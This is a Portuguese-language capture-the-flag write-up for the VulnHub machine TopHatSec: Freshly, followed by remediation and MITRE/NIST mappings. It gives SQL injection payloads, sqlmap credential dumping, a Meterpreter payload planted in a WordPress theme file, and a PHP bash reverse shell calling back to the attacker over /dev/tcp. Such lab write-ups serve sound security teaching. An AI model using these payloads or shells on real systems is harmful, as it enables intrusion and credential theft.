# TopHatSec: Freshly — SQLi Fresquinho, Shell Fresquinho

Caramba, TopHatSec: Freshly é uma daquelas máquinas que ensina SQL injection da forma mais satisfatória possível: faça dump de credenciais de um formulário de login, use-as contra um CMS, injete um shell e saia como root. Três portas web, dois bancos de dados, uma cadeia limpa. O "freshly" no nome é top demais porque cada passo parece fresco mesmo que as técnicas sejam clássicas. Grande respeito ao TopHatSec pelo design limpo. gg.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | TopHatSec: Freshly |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/tophatsec-freshly,118/ |
| **Técnicas** | Varredura multi-porta Nmap, Nikto web scan, dump SQL injection com sqlmap, login WordPress admin, injeção PHP no editor de tema WordPress, Meterpreter via msfvenom + Metasploit, escalação de privilégios por reuso de senha via `su` |
| **CVEs** | CWE-89 (SQL Injection em formulário de login: porta 80), CWE-434 (Injeção irrestrita de código PHP via editor de tema WordPress), CWE-522 (Credenciais Insuficientemente Protegidas: senha admin WordPress reutilizada como root) |
| **Grupos APT** | APT41: usa SQL injection para acesso inicial a credenciais em aplicações web, depois pivota para exploração de CMS; FIN7: explora especificamente instalações WordPress via acesso de credenciais admin e injeção de código para acesso persistente |

---

## Resumo do Ataque

```
nmap → portas 80, 443, 8080
  → porta 80: página de login vulnerável a SQL injection
  → sqlmap: dump banco wordpress8080 → admin:senha_admin
  → porta 8080: instalação WordPress
  → login admin WordPress com credenciais obtidas
  → Aparência > Editor de Tema > 404.php → payload PHP Meterpreter
  → msfvenom: gerar payload → msfconsole multi/handler
  → sessão Meterpreter como www-data
  → su - com senha admin WordPress (reuso) → root
  → /root/flag.txt
```

---

## Metodologia

1. Descoberta de host e varredura multi-porta
2. Nikto scan para fingerprinting de vulnerabilidades web
3. Identificação e exploração de SQL injection na porta 80
4. Dump de credenciais do banco wordpress8080
5. Autenticação WordPress admin na porta 8080
6. Injeção de payload Meterpreter via editor de tema
7. Escalação de privilégios via reuso de senha admin WordPress

---

## Passo 1 — Descoberta de Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.112

nmap -sV -sC -p- 192.168.1.112
nikto -h http://192.168.1.112
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd (página de login customizada)
443/tcp  open  https   Apache httpd
8080/tcp open  http    Apache httpd (WordPress)
```

Três serviços web. Porta 80 é o alvo de injeção. Porta 8080 é o WordPress. Porta 443 pode ser um redirecionamento ou conteúdo adicional.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Identificação de SQL Injection na Porta 80

Acesse `http://192.168.1.112/`. Aparece um formulário de login. Teste SQL injection:

```bash
# Teste manual no campo senha:
admin' OR 1=1-- -
' OR '1'='1
```

Se o login bem-sucede com payload SQLi, confirme a injeção e vá para sqlmap:

```bash
# Capture a requisição de login com Burp Suite e salve em /tmp/request.txt
# Depois:
sqlmap -r /tmp/request.txt --level=3 --risk=2 --dbs
```

Enumere bancos de dados. Encontre: `wordpress8080` entre os bancos.

**Alternativa (sem Burp):**

```bash
sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  --level=3 \
  --risk=2 \
  --dbs
```

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público

---

## Passo 3 — Dump de Credenciais via sqlmap

Faça dump do banco `wordpress8080`:

```bash
sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  -D wordpress8080 \
  --tables

sqlmap -u "http://192.168.1.112/" \
  --data="username=admin&password=test" \
  -D wordpress8080 \
  -T wp_users \
  --dump
```

Recupere credenciais admin WordPress. O hash em wp_users pode ser um hash MD5 WordPress ou texto puro dependendo da versão:

```bash
# Se hasheado (WordPress phpass):
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```

**Nota real:** SQL injection em formulários de login permanece um dos achados críticos mais comuns em avaliações web. O OWASP Top 10 listou SQL injection como categoria principal consistentemente. FIN7 ataca especificamente páginas de login CMS como vetores de acesso inicial a credenciais.

**MITRE ATT&CK:** T1190 — Explorar Aplicação Voltada ao Público; T1552.001 — Credenciais em Arquivos

---

## Passo 4 — Login WordPress Admin na Porta 8080

Navegue para `http://192.168.1.112:8080/wp-admin/`. Faça login com as credenciais obtidas.

Acesso admin WordPress bem-sucedido equivale a comprometimento do servidor.

**MITRE ATT&CK:** T1078 — Contas Válidas

---

## Passo 5 — Payload Meterpreter via Editor de Tema WordPress

Gere um payload PHP Meterpreter:

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.x \
  LPORT=4444 \
  -f raw \
  -o /tmp/shell.php
```

No Admin WordPress: **Aparência > Editor de Tema > 404.php**

Substitua o conteúdo do 404.php pelo payload msfvenom. Salve.

Inicie o handler Metasploit:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.x
set LPORT 4444
run
```

Acione o payload navegando para uma página inexistente do WordPress:

```bash
curl http://192.168.1.112:8080/wp-content/themes/<tema>/404.php
```

Sessão Meterpreter abre como `www-data`.

**Alternativa:** Use um PHP reverse shell básico em vez de Meterpreter:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.x/4444 0>&1'"); ?>
```

**MITRE ATT&CK:** T1505.003 — Web Shell; T1059.004 — Shell Unix

---

## Passo 6 — Estabilização do Shell

Do Meterpreter, descua para um shell adequado:

```bash
meterpreter > shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

**MITRE ATT&CK:** T1059.004 — Shell Unix

---

## Passo 7 — Escalação de Privilégios via Reuso de Senha

A senha admin WordPress é a mesma que a senha root. Tente:

```bash
su -
# Digite a senha admin WordPress

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
```

Reuso de senha entre a conta admin WordPress e a conta root Linux é o caminho de escalação. Sem CVE necessário: apenas tente a mesma senha em todo lugar.

**Nota real:** Reuso de senha entre contas de aplicação e contas de sistema é extremamente comum em ambientes reais, especialmente em servidores de propósito único onde um admin gerencia tudo. Isso é consistentemente um dos achados de maior impacto em testes de intrusão internos.

**MITRE ATT&CK:** T1078.003 — Contas Válidas: Contas Locais; T1548.003 — Abuso de Controle de Elevação: su

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credenciais admin WordPress | (dump via sqlmap) | DB wordpress8080 wp_users | Login admin WordPress |
| Senha root | mesma que admin WordPress | reuso de senha | su root |
| Flag root | flag.txt | /root/flag.txt | conclusão |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | SQL injection em formulário de login | SQLi em formulário de login está consistentemente no OWASP Top 10; queries parametrizadas resolvem completamente | Use prepared statements para todo SQL; nunca concatene input do usuário em queries |
| 2 | Dump de credenciais entre bancos (SQLi porta 80 dá creds WordPress porta 8080) | Acesso por SQL injection pode fazer dump de todos os bancos do servidor, não apenas do alvo | Contas de banco de dados separadas por aplicação; usuários DB com menor privilégio |
| 3 | Editor de tema WordPress como webshell | Qualquer admin WordPress pode injetar PHP arbitrário via editor de tema; isso é uma feature RCE embutida | `define('DISALLOW_FILE_EDIT', true);` no wp-config.php; desativar editor de tema |
| 4 | Reuso de senha entre admin WordPress e root | Gerenciamento único do sistema cria cadeias de credenciais que colapsam camadas de segurança | Senhas únicas por conta; use gerenciador de senhas; PAM para contas do sistema |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação Voltada ao Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos (dump DB) | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Persistência | Persistência | Web Shell: Injeção no Tema | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Contas Válidas: Contas Locais | T1078.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: su | T1548.003 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Parametrize todas as queries SQL** — prepared statements para todo formulário de login; sem concatenação de strings
2. **Use contas de banco de dados por aplicação** — WordPress deve ter seu próprio usuário DB com acesso apenas ao seu próprio schema
3. **Desative o editor de tema/plugin WordPress** — `define('DISALLOW_FILE_EDIT', true);` no wp-config.php
4. **Aplique senhas únicas** — senha admin WordPress não deve igualar nenhuma senha de conta do sistema; use gerenciador de senhas
5. **Implemente hardening WordPress** — limitação de taxa em wp-login.php; 2FA; fail2ban para proteção contra brute-force
6. **Separe servidores web e banco de dados** — execute MySQL em host separado acessível apenas pelo servidor web

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os formulários de login voltados para web para SQL injection |
| Proteger | Controle de Acesso | Queries parametrizadas; usuários DB por aplicação; 2FA WordPress |
| Proteger | Segurança de Dados | Senhas únicas por conta; gerenciador de segredos |
| Detectar | Anomalias e Eventos | Alertar sobre padrões SQLi em logs web; anomalias de login admin WordPress |
| Responder | Planejamento de Resposta | Remover webshells; rotacionar credenciais; corrigir SQL injection |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input de Informação | Queries parametrizadas previnem SQL injection em todos os formulários |
| AC-6 | Menor Privilégio | Usuários DB por aplicação; sem senha admin WordPress = root |
| IA-5 | Gerenciamento de Autenticador | Senhas únicas por conta; rotação regular |
| CM-7 | Funcionalidade Mínima | Desativar editor de tema WordPress |
| AU-12 | Geração de Registro de Auditoria | Registrar todas as ações admin WordPress e tentativas de login |

### CISA KEV

SQL injection em formulários de login web é uma classe de vulnerabilidade top explorada pela CISA KEV. Múltiplos CVEs no catálogo da CISA descrevem SQL injection em aplicações web usadas como vetores de acesso inicial. A orientação de Vulnerabilidades Mais Rotineiramente Exploradas da CISA 2022 destaca especificamente a validação imprópria de input como um problema crítico persistente.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Consciência Situacional (SITUATION) | Realizar Registro de Logs | MIL2 |

### MITRE D3FEND

- **D3-IVA** — Validação de Input (queries parametrizadas)
- **D3-ACH** — Hardening de Configuração de Aplicação (desativar editor WP; usuários DB por aplicação)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (senhas únicas de sistema)

---

## Considerações Finais

TopHatSec: Freshly é uma máquina limpa e eficiente. A cadeia SQLi-para-CMS-para-reuso-de-senha é exatamente o tipo de caminho de ataque que aparece em avaliações reais de pequenas e médias empresas constantemente. Sem técnicas exóticas: apenas fundamentos executados bem.

A lição mais fresca aqui é que SQL injection em um serviço (porta 80) compromete um serviço completamente diferente (WordPress porta 8080) porque ambos compartilham o mesmo servidor de banco de dados. A superfície de ataque é sempre maior do que parece.

Thanks guys!! (❍ᴥ❍ʋ)
